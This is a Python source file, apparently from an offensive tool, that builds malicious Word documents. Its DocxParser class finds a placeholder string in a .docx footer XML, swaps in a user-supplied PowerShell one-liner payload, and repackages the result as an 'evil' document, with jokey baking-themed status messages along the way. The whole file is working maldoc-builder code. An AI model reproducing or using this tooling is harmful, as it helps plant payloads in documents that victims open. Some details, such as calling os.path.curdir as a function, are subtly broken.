from lxml import etree
from utils import *		# import sys, os, io, zipfile, __location__


class DocxParser(object):
	def __enter__(self):
		return self

	def __init__(self, docx_infile, docx_outfile=None, payload=None):
		# Initializes the class after ensuring in/outfile paths exist
		try:
			if os.path.isfile(os.path.realpath(docx_infile)):
				self.path = os.path.realpath(docx_infile)
			else:
				printerr("[-] I can't use ingredients you don't have, Sweetie. {0} does not exist".format(os.path.realpath(docx_infile)))
				sys.exit(1)
			if docx_outfile:
				if os.path.realpath(os.path.dirname(docx_outfile)) != self.path:
					self.malpath = os.path.dirname(os.path.realpath(docx_outfile))
					if os.path.isdir(os.path.dirname(self.malpath)) is False:
						printerr("[-] I can't put your cookies there. {0} does not exist".format(os.path.realpath(docx_outfile).split('/')[-1]))
						sys.exit(1)
			else:
				self.malpath = os.path.curdir()
		except OSError as e:
			printerr("[-] Oops! I spilled your ingredients because of an unhandled exception! Mind sending me a stacktrace?\n")
			print(e)
			sys.exit(-1)

		self.docx = docx_infile
		self.maldocx = os.path.realpath(docx_outfile)
		self.zipped_docx = zipfile.ZipFile(self.docx)
		self.xml_files = self.read_xml_file_list()
		self.payload = payload
		# print(self.docx, self.maldocx, self.zipped_docx, self.xml_files, self.payload)			# DEBUG, print class details

	def read_xml_file_list(self):
		xml_list = [file.filename for file in self.zipped_docx.filelist if '.xml' in file.filename]
		return xml_list

	def list_footers(self):
		footer_files = []
		for file in self.xml_files:
			if 'footer' in file:
				footer_files.append(file)
		return footer_files

	def find_xml_file(self, target):
		for filename in self.xml_files:
			if target in filename:
				return True
		print("[-] Hmm... I can't seem to find any XML in this docx...Could we try a different one?")
		return False

	# Used in parsing the XML file for string to replace with malicious payload
	def parse_tree(self, target, search_string="zzzmalstring", mode='r'):
		try:
			xml_content = self.zipped_docx.read(target)
			tree = etree.tostring(etree.fromstring(xml_content), pretty_print=True).decode()
			# print(tree)			# DEBUG, print raw xml before payload is inserted
			if search_string in tree:
				if mode == 'w':
					print("[+] Tossing three cups of evil into the XML...".format(search_string, target))			# DEBUG
					self.evil_xml = self.write_malstring_to_xml(self.payload, tree)
				# print(self.evil_xml) 			# DEBUG, print the raw xml included in payload
				return True
			else:
				return False
		except KeyError:
			print("[*] No footers exist.")
			return False

	def write_malstring_to_xml(self, malstring, raw_xml):  # Replace "zzzmalstring" with malicious one-liner
		bad_tree = raw_xml.replace('zzzmalstring', malstring)
		xml_contents = etree.tostring(etree.fromstring(bad_tree))
		print("[+] Added a teaspoon of powershell...")
		return xml_contents

	# Creates the generic XML footer file without a payload
	def create_xml_footer(self, target):
		if len(self.xml_files) < 1:
			printerr("[-] The docx is empty! Cannot continue.")
			sys.exit(2)
		print("[+] Brewing the evil.docx...")
		retry = True
		while retry:
			for filename in self.xml_files:
				if target.upper == "Q":
					sys.exit(0)
				elif target in filename:
					target = input("[-] That xml file already exists! Choose another target or 'Q' to quit: ")
				elif 'footer' not in target:
					target = input("[-] Non-footer files are not supported. Try something like word/footer1.xml or 'Q' to quit: ")
				else:
					try:
						xml = io.StringIO()
						xml.write(footer_file)
						print("[+] The footer.xml is done rising: {0}...".format(target))
						return xml

					except OSError as e:
						printerr("[-] Failed to bake an evil footer: {0}".format(target))
						if input("Dump Stacktrace? [y/N]").upper() == "Y":
							print(e)
						sys.exit(2)

	# By default, replaces 'zzzmalstring' with the payload defined by user
	def make_payload_xml(self, oldstring):
		return footer_file.replace(oldstring, self.payload)

	# Main method for building the carrier file with fully injected malicious payload
	def build(self):
		self.read_xml_file_list()
		footers = self.list_footers()
		for file in footers:
			print('[+] Checking for my recipe...')
			if self.parse_tree(file):
				print('[+] Ah, here it is!')
				self.parse_tree(file, mode='w')
				target = file
				evil_zip = InMemoryZip()
				break
		if 'evil_zip' not in locals():
			printerr(
				"[-] Sorry, Love, this recipe didn't come from my cookbook. I can't use it.\n"
				"\tCopy and modify the blank.docx from my templates directory before using as an input file.")
			exit()
		print(
			"[+] ...Some malicious intent, and a few naughty thoughts ;)\n"
			"[+] Mixing XML into the DOCX...")
		for file in self.zipped_docx.namelist():
			if file != target:					# Exclude the old target so as not to duplicate it
				evil_zip.append(file, self.zipped_docx.open(file).read())

		evil_zip.append(target, self.evil_xml)
		print("[+] The cookies are in the oven...")
		evil_zip.writetofile(self.maldocx)
		print("[+] DING! The evil cookies are done!")

	# Cleaning up memory
	def __exit__(self, exc_type, exc_value, traceback):
		self.zipped_docx.close()